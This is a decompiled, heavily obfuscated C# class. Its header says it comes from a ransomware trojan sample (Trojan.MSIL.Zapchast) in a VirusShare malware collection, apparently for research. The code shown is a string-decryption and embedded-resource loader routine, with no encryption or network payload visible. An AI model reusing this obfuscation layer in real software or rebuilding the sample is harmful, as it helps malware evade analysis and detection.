// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Crypter, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: B731B599-442F-4A0A-B652-36FDF3199CF1
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Trojan.MSIL.Zapchast.ctbt-4d7f60f5f9cd63e753868459d0468b2925cdad0dc9dd53f889e662aa428efebf.exe

using \u0003;
using \u000F;
using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace \u000F
{
  internal sealed class \u0002
  {
    private static readonly string \u0001;
    private static readonly string \u0002;
    private static readonly byte[] \u0001;
    private static readonly Dictionary<int, string> \u0001;
    private static readonly bool \u0001;
    private static readonly int \u0001;

    public static string \u0001([In] int obj0)
    {
      string str1;
      int num1;
      int num2;
      int num3;
      byte[] numArray1;
      string str2;
      try
      {
        obj0 -= \u0002.\u0001;
        if (\u0002.\u0001)
        {
          \u0002.\u0001.TryGetValue(obj0, out str1);
          switch (str1)
          {
            case null:
              break;
            default:
              return str1;
          }
        }
        num3 = 0;
        num1 = obj0;
        num2 = (int) \u0002.\u0001[num1++];
        if ((num2 & 128) == 0)
        {
          num3 = num2;
          if (num3 == 0)
            return string.Empty;
        }
        else
          num3 = (num2 & 64) != 0 ? ((num2 & 31) << 24) + ((int) \u0002.\u0001[num1++] << 16) + ((int) \u0002.\u0001[num1++] << 8) + (int) \u0002.\u0001[num1++] : ((num2 & 63) << 8) + (int) \u0002.\u0001[num1++];
        string str3;
        try
        {
          numArray1 = \u0080.\u000F\u0002(\u007F.\u007E\u000E\u0002((object) \u001F.\u0007\u0002(), \u0002.\u0001, num1, num3));
          str2 = \u0004.\u0005(\u007F.\u007E\u000E\u0002((object) \u001F.\u0007\u0002(), numArray1, 0, numArray1.Length));
          if (\u0002.\u0001)
          {
            try
            {
              \u0002.\u0001.Add(obj0, str2);
            }
            catch
            {
            }
          }
          str3 = str2;
        }
        catch
        {
          str3 = (string) null;
        }
        return str3;
      }
      catch (Exception ex)
      {
        string str4 = str1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local1 = (ValueType) num3;
        // ISSUE: variable of a boxed type
        __Boxed<int> local2 = (ValueType) num1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local3 = (ValueType) num2;
        byte[] numArray2 = numArray1;
        string str5 = str2;
        string str6;
        string str7 = str6;
        // ISSUE: variable of a boxed type
        __Boxed<int> local4 = (ValueType) obj0;
        \u0007.\u0003.\u0001(ex, (object) str4, (object) local1, (object) local2, (object) local3, (object) numArray2, (object) str5, (object) str7, (object) local4);
        throw;
      }
    }

    static \u0002()
    {
      int length;
      byte[] numArray1;
      Stream stream1;
      Assembly assembly1;
      try
      {
        \u0002.\u0001 = "1";
        \u0002.\u0002 = "81";
        do
        {
          \u0002.\u0001 = (byte[]) null;
          \u0002.\u0001 = false;
          \u0002.\u0001 = 0;
          if (\u0006.\u000E(\u0002.\u0001, "1"))
            \u0002.\u0001 = true;
          else
            goto label_3;
        }
        while (false);
        goto label_12;
label_3:
        \u0002.\u0001 = \u0081.\u0010\u0002(\u0002.\u0002);
        assembly1 = global::\u000F.\u0013();
        stream1 = \u0082.\u007E\u0011\u0002((object) assembly1, "{d2e99e86-ae6c-4859-b284-9fb1da8df616}");
        try
        {
          do
          {
            if (true)
            {
              int num1 = \u0084.\u0013\u0002(\u0083.\u007E\u0012\u0002((object) stream1));
              while (true)
              {
                length = num1;
                numArray1 = new byte[length];
                int num2 = \u0086.\u007E\u0014\u0002((object) stream1, numArray1, 0, length);
                if (false)
                  num1 = num2;
                else
                  break;
              }
            }
            \u0002.\u0001 = \u0001.\u0001(numArray1);
          }
          while (false);
          numArray1 = (byte[]) null;
          \u0015.\u007E\u001B((object) stream1);
          return;
        }
        finally
        {
          if (stream1 != null)
            \u0015.\u007E\u001C((object) stream1);
        }
label_12:
        \u0002.\u0001 = new Dictionary<int, string>();
        goto label_3;
      }
      catch (Exception ex)
      {
        Assembly assembly2 = assembly1;
        Stream stream2 = stream1;
        // ISSUE: variable of a boxed type
        __Boxed<int> local = (ValueType) length;
        byte[] numArray2 = numArray1;
        \u0007.\u0003.\u0001(ex, (object) assembly2, (object) stream2, (object) local, (object) numArray2);
        throw;
      }
    }
  }
}
